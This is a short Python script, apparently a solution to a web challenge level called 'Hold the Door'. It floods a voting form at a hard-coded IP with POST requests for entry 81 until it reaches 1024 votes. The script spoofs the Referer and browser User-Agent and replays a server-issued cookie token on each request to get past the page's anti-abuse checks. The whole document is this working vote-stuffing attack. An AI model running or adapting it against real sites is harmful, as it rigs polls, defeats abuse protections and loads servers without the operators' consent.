import requests
header =  {'Content-Type': 'application/x-www-form-urlencoded',
           'Referer': 'http://54.221.6.249/level2.php',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'

}
URL = 'http://54.221.6.249/level2.php'
payload = {
    'id': '81',
    'holdthedoor': 'Submit',
    'key': '0'
}
cookies = {
    'HoldTheDoor': '0'
}


r = requests.get(URL)
while "81    </td>\n    <td>\n1024" not in r.text:
    cookies['holdthedoor'] = r.cookies['HoldTheDoor']
    r = requests.post(URL, data=payload, headers=header, cookies=cookies)
    print(r.text)
print("Voting complete!")
